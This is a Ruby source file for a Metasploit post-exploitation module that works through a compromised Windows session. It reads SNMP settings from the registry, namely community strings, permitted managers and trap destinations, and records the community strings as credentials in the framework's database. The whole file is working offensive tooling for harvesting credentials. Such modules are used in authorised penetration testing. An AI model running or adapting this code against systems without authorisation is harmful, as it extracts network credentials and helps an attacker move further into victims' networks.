##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather SNMP Settings',
        'Description' => %q{ This module will enumerate the SNMP service configuration. },
        'License' => MSF_LICENSE,
        'Author' => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'Tebo <tebo[at]attackresearch.com>'
        ],
        'References' => [
          ['MSB', 'MS00-096'],
          ['URL', 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-096'],
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => %w[shell powershell meterpreter],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    unless snmp_installed?
      print_error("\tSNMP service is not installed on the target host")
      return
    end

    print_status("\tSNMP is installed!")

    community_strings
    snmp_permitted_managers
    trap_configuration
  end

  # Check if SNMP is installed on the target host
  #
  # @return [Boolean] True if the SNMP service is installed
  def snmp_installed?
    print_status('Checking if SNMP service is installed')
    registry_enumkeys('HKLM\\System\\CurrentControlSet\\Services').include?('SNMP')
  end

  # Enumerate configured Community Strings
  def community_strings
    print_status('Enumerating community strings')
    key = 'HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities'

    unless registry_key_exist?(key)
      print_error("\tInsufficient privileges to retrieve Community Strings or none configured")
      return
    end

    comm_strings = registry_enumvals(key)

    if comm_strings.blank?
      print_status("\tNo Community strings configured")
      return
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'Community Strings',
      'Indent' => 1,
      'Columns' =>
      [
        'Name',
        'Type'
      ]
    )

    comm_strings.each do |c|
      # comm_type is for human display, access_type is passed to the credential
      # code using labels consistent with the SNMP login scanner
      type = registry_getvaldata(key, c)

      case (type.to_s.starts_with?('0x') ? type.to_i(16) : type.to_i)
      when 4
        comm_type = 'READ ONLY'
        access_type = 'read-only'
      when 1
        comm_type = 'DISABLED'
        access_type = 'disabled'
      when 2
        comm_type = 'NOTIFY'
        access_type = 'notify'
      when 8
        comm_type = 'READ & WRITE'
        access_type = 'read-write'
      when 16
        comm_type = 'READ CREATE'
        access_type = 'read-create'
      else
        print_warning("Unknown access type for '#{c}' : #{type}")
        comm_type = 'UNKNOWN'
        access_type = ''
      end

      tbl << [c, comm_type]

      register_creds(session.session_host, 161, '', c, 'snmp', access_type)
    end
    print_status

    tbl.to_s.each_line do |l|
      print_status("\t#{l.chomp}")
    end
    print_status

    true
  end

  # Enumerate configured SNMP Traps
  def trap_configuration
    print_status('Enumerating Trap configuration')

    key = 'HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\TrapConfiguration'

    unless registry_key_exist?(key)
      print_error("\tInsufficient privileges to retrieve SNMP Traps or none configured")
      return
    end

    trap_hosts = registry_enumkeys(key)

    if trap_hosts.blank?
      print_status("\tNo Traps are configured")
      return
    end

    trap_hosts.each do |c|
      print_status("Community Name: #{c}")

      t_comm_key = key + '\\' + c
      destinations = registry_enumvals(t_comm_key)
      next if destinations.blank?

      destinations.each do |t|
        trap_dest = registry_getvaldata(t_comm_key, t)
        print_status("\tDestination: #{trap_dest}")
        register_creds(trap_dest, 162, '', c, 'snmptrap', 'trap')
      end
    end
  end

  # Enumerate Permitted Managers
  # Check which hosts can connect using the Community Strings
  def snmp_permitted_managers
    print_status('Enumerating Permitted Managers for Community Strings')
    key = 'HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\PermittedManagers'

    unless registry_key_exist?(key)
      print_error("\tInsufficient privileges to retrieve Permitted Managers or none configured")
      return
    end

    managers = registry_enumvals(key)

    if managers.blank?
      print_status("\tSNMP packets are accepted from any host")
      return
    end

    print_status('SNMP packets are accepted from:')
    managers.each do |m|
      print_status("\t#{registry_getvaldata(key, m)}")
    end
  end

  def register_creds(client_ip, client_port, user, pass, service_name, access_type)
    service_data = {
      address: client_ip,
      port: client_port,
      service_name: service_name,
      protocol: 'udp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      access_level: access_type,
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_data: pass,
      private_type: :password,
      username: user,
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
